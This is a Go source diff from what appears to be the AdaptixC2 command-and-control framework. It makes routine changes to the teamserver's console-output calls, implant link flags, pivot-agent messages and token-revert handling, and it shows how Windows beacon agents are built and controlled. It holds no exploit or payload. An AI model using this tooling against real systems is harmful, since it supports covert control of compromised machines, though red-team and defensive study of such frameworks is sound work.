@@ -31,7 +31,7 @@ type Teamserver interface {
 	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
 	TsAgentBuildLog(builderId string, status int, message string) error
 
-	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
+	TsAgentConsoleOutput(agentId string, client string, messageType int, message string, clearText string, store bool)
 
 	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
 	TsGetPivotInfoByName(pivotName string) (string, string, string)
@@ -299,7 +299,7 @@ var (
 	ObjectDir_dns  = "objects_dns"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
-	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ -mwindows"
 )
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
@@ -1973,10 +1973,10 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 			if linkType == 1 {
 				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			} else if linkType == 2 {
 				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
-				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
 			}
 
 		case COMMAND_LS:
@@ -2324,10 +2324,9 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 		case COMMAND_REV2SELF:
 			task.Message = "Token reverted successfully"
-			emptyImpersonate := ""
 			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
 				Impersonated *string `json:"impersonated"`
-			}{Impersonated: &emptyImpersonate})
+			}{Impersonated: new("")})
 
 		case COMMAND_RM:
 			if false == packer.CheckPacker([]string{"byte"}) {
@@ -2453,11 +2452,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			if pivotType != 0 {
 				_ = Ts.TsPivotDelete(pivotId)
 				if TaskId == 0 {
-					Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
+					Ts.TsAgentConsoleOutput(parentAgentId, "", adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
 				} else {
 					task.Message = messageParent
 				}
-				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
+				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
 			}
 
 		case COMMAND_UPLOAD:
